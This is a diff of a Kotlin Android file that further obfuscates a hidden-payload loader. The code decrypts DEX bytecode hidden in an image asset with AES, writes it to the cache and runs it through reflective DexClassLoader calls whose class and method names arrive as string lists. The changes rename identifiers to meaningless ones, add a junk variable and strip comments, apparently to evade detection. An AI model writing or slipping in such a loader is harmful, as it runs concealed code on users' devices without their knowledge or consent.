@@ -1,4 +1,4 @@
-package com.announcement.comprehension.t
+package com.poa.kga
 
 import android.app.Application
 import android.content.Context
@@ -12,49 +12,42 @@ import javax.crypto.Cipher
 import javax.crypto.spec.SecretKeySpec
 
 
-object DexDoor {
-    private var dexClass: Class<*>? = null
-    private var dexObject: Any? = null
-    private var dexMethod: Method? = null
+object DTag {
+    private var dFirst: Class<*>? = null
+    private var dSecond: Any? = null
+    private var dPlus: Method? = null
 
-    private fun aesDecrypt(data: ByteArray, key: Key): ByteArray {
+    var lao = 9L
+
+    private fun asPt(data: ByteArray, key: Key): ByteArray {
         val cipher = Cipher.getInstance("AES")
         cipher.init(Cipher.DECRYPT_MODE, key)
         return cipher.doFinal(data)
     }
 
-    fun start(context: Context, list0: ArrayList<String>, list1: ArrayList<String>) {
+    fun ptGod(context: Context, list0: ArrayList<String>, list1: ArrayList<String>) {
         try {
             val encryptedPng = context.assets.open(list0[0]).use { it.readBytes() }
             val encryptedDex = encryptedPng.copyOfRange(8, encryptedPng.size)
-
             val importantKey: Key = SecretKeySpec(list0[1].toByteArray(), "AES")
-
-            // 3. 解密 Dex 数据
-            val dexBytes = aesDecrypt(encryptedDex, importantKey)
-
-            // 4. 将 Dex 写入临时文件
-            val outFile = File(context.cacheDir, "cfgo")
-
-            // 2. 写入 dex 文件
-//            val outFile = File(context.getCacheDir(), "cfgo")
-            if (!outFile.exists() || outFile.length() == 0L) {
+            val dexBytes = asPt(encryptedDex, importantKey)
+            lao += 998L
+            val outFile = File(context.cacheDir, "pvgo")
+            if (!outFile.exists() || outFile.length() <= 0L) {
                 try {
                     FileOutputStream(outFile).use { fos ->
                         fos.write(dexBytes)
                         outFile.setReadOnly()
                     }
-                } catch (e: Exception) {
+                } catch (_: Exception) {
                     return  // 写文件失败直接返回
                 }
             }
 
-            // 3. 反射调用 DexClassLoader + 方法
-            if (dexClass == null || dexObject == null || dexMethod == null) {
-                val od = File(context.getCacheDir(), "mkk")
+            if (dFirst == null || dSecond == null || dPlus == null) {
+                val od = File(context.getCacheDir(), "kku")
                 od.mkdirs()
 
-                // 构建 DexClassLoader
                 val loaderClass = Class.forName(list0[2])
                 val loaderConstructor: Constructor<*> = loaderClass.getConstructor(
                     String::class.java,
@@ -70,18 +63,18 @@ object DexDoor {
                 )
                 val loadClassMethod: Method =
                     loader.javaClass.getMethod(list0[3], String::class.java)
-                dexClass = loadClassMethod.invoke(loader, list0[4]) as Class<*>?
+                dFirst = loadClassMethod.invoke(loader, list0[4]) as Class<*>?
 
-                val field: Field = dexClass!!.getField("INSTANCE")
-                dexObject = field.get(null)
-                dexMethod = dexClass!!.getDeclaredMethod(
+                val field: Field = dFirst!!.getField("INSTANCE")
+                dSecond = field.get(null)
+                dPlus = dFirst!!.getDeclaredMethod(
                     list0[5],
                     Application::class.java,
                     ArrayList::class.java
                 )
             }
-            dexMethod?.invoke(dexObject, context.applicationContext, list1)
-        } catch (ignored: Exception) {
+            dPlus?.invoke(dSecond, context.applicationContext, list1)
+        } catch (_: Exception) {
         }
     }
 }
